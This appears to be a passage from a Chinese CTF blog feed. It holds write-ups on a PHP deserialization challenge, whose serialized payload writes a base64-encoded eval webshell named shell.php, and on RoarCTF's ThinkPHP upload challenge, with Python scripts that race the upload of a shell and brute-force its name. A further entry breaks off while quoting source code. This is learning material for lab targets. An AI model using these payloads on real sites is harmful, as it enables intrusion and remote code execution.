class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'base64_decode'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">？data&#x3D;O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A4%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22expire%22%3Bi%3A1%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3BN%3Bs%3A8%3A%22autosave%22%3Bi%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A60%3A%22MTExUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ%3D%3D%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="不解之处"><a href="#不解之处" class="headerlink" title="不解之处"></a>不解之处</h2><p>迷惑的是，这样就不报错</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n";file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样字符不够会报错。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $data;file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样也报错</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $data . '111';file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RoarCTF 2019]Simple Upload</title>
      <link href="/p/2343151245.html"/>
      <url>/p/2343151245.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[thinkphp|uniqid|thinkphp上传]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实例化上传类</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment">// 设置附件上传大小</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传类型</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传目录</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传子目录</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 上传错误提示错误信息</span>          <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">// 上传成功 获取上传文件信息</span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savepath'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url"</span><span class="token operator">=></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"success"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>thinkphp的上传，默认上传地址为<code>/home/index/upload</code>,这真想不到</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ce34bf36-7954-4ba3-b71b-971bc4084686.node4.buuoj.cn:81&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816190128299.png"></p><p>上传成功后会给出路径</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816193301468.png"></p><h3 id="thinkphp上传漏洞"><a href="#thinkphp上传漏洞" class="headerlink" title="thinkphp上传漏洞"></a>thinkphp上传漏洞</h3><p>ThinkPHP里的<code>upload()</code>函数在不传参的情况下是批量上传的，整个<code>$_FILES</code>数组的文件都会上传保存，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测</p><p>而且，thinkphp对于文件命名是用<code>uniqid()</code>函数，这是基于毫秒级的当前时间。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一快点就变两位，一般来说就变三位。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816193800088.png"></p><p>可见，我只要上传图片1，shell，图片2，然后就能爆破出shell文件的文件名。</p><p>因为是16进制，所以需要字符只有</p><pre class="line-numbers language-none"><code class="language-none">0123456789abcdef<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://0023f6ee-d192-4ad9-8864-87af34a495f6.node4.buuoj.cn:81/index.php/home/index/upload'</span>file1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment"># upload()不传参时即是批量上传所以用[]</span>file2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file[]'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-08-16\&#x2F;611a6459b7a3b.txt&quot;,&quot;success&quot;:1&#125;&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-08-16\&#x2F;611a6459dd848.txt&quot;,&quot;success&quot;:1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样上传还挺慢的，需要爆破5位。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">'http://0023f6ee-d192-4ad9-8864-87af34a495f6.node4.buuoj.cn:81/'</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> o <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                    url <span class="token operator">=</span> target<span class="token operator">+</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>o<span class="token operator">+</span>p<span class="token operator">+</span><span class="token string">".php"</span>                    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>                    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width, initial-scale=1.0"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">POST</span>数据包<span class="token constant">POC</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"http://ce34bf36-7954-4ba3-b71b-971bc4084686.node4.buuoj.cn:81/index.php/home/index/upload"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"hidden"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"123"</span> <span class="token operator">/</span><span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file2"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816202350971.png"></p><pre class="line-numbers language-none"><code class="language-none">\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-08-16\&#x2F;611a58b82a4b0.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816211600446.png"></p><p>试了两回，终于跑到了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816214902005.png"></p><p>打开一看，直接给了flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816214918891.png"></p><h2 id="不解之处"><a href="#不解之处" class="headerlink" title="不解之处"></a>不解之处</h2><p>迷惑的是，如果是上传txt，数据包可以随便改</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816210750651.png"></p><p>但换成图片，哪怕是把下面的file1改为file2，都不会返回路径</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816210821710.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816210906217.png"></p><p>且<code>Content-Length: 3568</code>一下变成<code>Content-Length: 4809</code></p><p>感觉就像是重新编码了一样，然后导致上传错误</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816211012651.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816211037845.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HarekazeCTF2019]Avatar Uploader</title>
      <link href="/p/2917397323.html"/>
      <url>/p/2917397323.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816141134001.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>上传限制png，还会检测尺寸，发包看不到反馈，挺烦的</p><p>原来题目还给了源码，</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check whether file is uploaded</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file size</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file type</span><span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file width/height</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// I hope this never happens...</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ok</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">flash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span 